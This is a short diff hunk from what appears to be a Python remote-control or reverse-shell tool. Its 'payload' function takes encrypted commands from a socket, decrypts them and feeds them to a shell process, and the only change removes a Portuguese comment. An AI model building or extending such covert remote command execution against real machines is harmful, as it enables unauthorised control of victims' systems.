@@ -244,7 +244,7 @@ def payload(target:TerminalSimulator, client:socket, BUFFER=4096, TIMEOUT=10):
 
         command_unencrypted = unencryptation(command_encrypted, target.encryptation_key, nonce)
 
-        if command_unencrypted == "SHELL CLS": #tratar comandos diferentes dependendo do ambiente (SO/DESKTOP etc)
+        if command_unencrypted == "SHELL CLS":
             return
 
         process.stdin.write(command_unencrypted + "\n")
